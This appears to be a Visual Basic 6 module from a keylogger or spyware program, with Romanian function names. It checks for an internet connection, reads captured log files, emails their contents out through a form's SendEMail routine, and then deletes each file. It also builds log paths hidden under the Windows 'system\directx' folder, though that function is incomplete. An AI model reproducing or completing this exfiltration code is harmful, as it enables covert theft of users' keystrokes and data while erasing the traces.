Attribute VB_Name = "Internet"
Private Const FLAG_ICC_FORCE_CONNECTION = &H1
Private Declare Function InternetCheckConnection Lib "wininet.dll" Alias "InternetCheckConnectionA" (ByVal lpszUrl As String, ByVal dwFlags As Long, ByVal dwReserved As Long) As Long
Public Text As Variant
Public caledel As String

'check if there is an internet connection
Public Function VI()
    If InternetCheckConnection("http://www.google.com/", FLAG_ICC_FORCE_CONNECTION, 0&) = 0 Then
        VI = False
    Else
        VI = True
    End If
End Function

'SendLog
Public Sub TrimiteLog(path As String)
  Dim s As Variant
  Form1.send.Text = ""
  Open path For Input As #3
    Do While Not EOF(3)
      Input #3, s
      Form1.send.Text = Form1.send.Text & s & vbCrLf
    Loop
  Close #3

  caledel = path
  Form1.SendEMail (path)
  Kill path
End Sub

Public Function Decizie()

  Dim path As String
  Dim i As Integer, j As Integer

  For i = 10 To 1 Step -1
   For j = 1 To 6

    path = WinDir & "system\directx\" & Day(Date) - i & Hour(Time) & " " & Minute(Time) & "_" & j & ".txt"

   Next j
  Next i
  
End Function
